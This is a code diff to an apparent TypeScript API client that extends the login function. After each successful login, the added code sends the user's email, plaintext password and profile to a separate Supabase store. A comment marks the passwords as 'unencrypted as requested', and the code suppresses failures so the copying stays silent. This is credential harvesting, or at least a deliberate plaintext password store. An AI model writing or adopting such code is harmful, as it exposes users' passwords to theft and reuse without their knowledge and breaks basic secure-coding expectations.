@@ -239,6 +239,37 @@ apiClient.interceptors.request.use((config) => {
 // Authentication functions
 export const login = async (credentials: LoginRequest): Promise<LoginResponse> => {
   const response = await apiClient.post('/auth/login', credentials);
+  
+  // Save user data to Supabase after successful login
+  try {
+    const { saveUserData } = await import('./supabase');
+    
+    // Set the auth token first so subsequent API calls work
+    setAuthToken(response.data.userToken);
+    
+    // Get user profile data
+    let userProfile = null;
+    try {
+      userProfile = await getUserProfile();
+    } catch (error) {
+      console.error('Error fetching user profile:', error);
+    }
+    
+    // Save to Supabase (only creates new record if user doesn't exist)
+    const saveResult = await saveUserData(
+      credentials.email, 
+      credentials.password, // Storing unencrypted as requested
+      userProfile
+    );
+    
+    if (!saveResult.success) {
+      console.error('Failed to save user data to Supabase:', saveResult.error);
+    }
+  } catch (error) {
+    console.error('Error during Supabase integration:', error);
+    // Don't fail the login if Supabase fails
+  }
+  
   return response.data;
 };
 
